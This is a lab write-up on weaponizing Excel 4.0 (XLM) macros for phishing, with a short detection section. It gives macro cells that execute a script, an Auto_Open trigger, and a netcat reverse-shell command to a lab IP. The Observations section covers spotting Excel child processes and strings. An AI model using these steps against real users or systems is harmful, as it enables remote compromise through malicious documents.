# Phishing: XLM / Macro 4.0

## Phishing: XLM / Macro 4.0

This lab is based on the research performed by [Stan Hegt from Outflank](https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/).

### Weaponization

A Microsoft Excel Spreadsheet can be weaponized by firstly inserting a new sheet of type "MS Execel 4.0 Macro":

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LOIzgbM029-Vd0__7Pp%2F-LOJ-K1pu5iRBnkRj5xK%2Fphishing-xlm-create-new.png?alt=media\&token=2fe9eb92-bd45-450e-9c66-7f172c7b31f3)

We can then execute command by typing into the cells:

```
=exec("c:\shell.cmd")
=halt()
```

As usual, the contents of shell.cmd is a simple netcat reverse shell:

{% code title="c:\shell.cmd" %}
```csharp
C:\tools\nc.exe 10.0.0.5 443 -e cmd.exe
```
{% endcode %}

Note how we need to rename the `A1` cell to `Auto_Open` if we want the Macros to fire off once the document is opened:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LOIzgbM029-Vd0__7Pp%2F-LOJ-K1ng9KAU7OBn7T4%2Fphishing-xlm-auto-open.png?alt=media\&token=6cba687b-2840-4163-8a8b-d761e2c43e86)

### Execution

Opening the document and enabling Macros pops a reverse shell:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LOIzgbM029-Vd0__7Pp%2F-LOJ-K1iLYnynKtP6piT%2Fphishing-xlm-shell-auto-open.gif?alt=media\&token=ee7e3e76-eec2-46d5-8d84-533a7babb549)

Note that XLM Macros allows using Win32 APIs, hence shellcode injection is also possible. See the original research link below for more info.

### Observations

As usual, look for any suspicious children originating from under the Excel.exe:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LOJGfhJ3tr1zOwNMn8j%2F-LOJGhQ91Wmbqn72LAZ0%2Fphishing-xlm-procexp.png?alt=media\&token=bde9149b-e060-4b16-8f7f-0f9646237f3f)

Having a quick look at the file with a hex editor, we can see a suspicious string `shell.cmd` immediately, which is of course good news for defenders:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LOJOHlQGdb0-wRjTYHC%2F-LOJOVXnSF8feuxO12WF%2Fphishing-xlm-hex.png?alt=media\&token=65d702ec-5277-4a99-890a-5e837ecc2a63)

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LOJOHlQGdb0-wRjTYHC%2F-LOJOe0SlJLeAim9LKEb%2Fphishing-xlm-strings.png?alt=media\&token=c543a92b-7a5a-4818-844d-7c5a7c4bfc53)

### References

{% embed url="https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/" %}
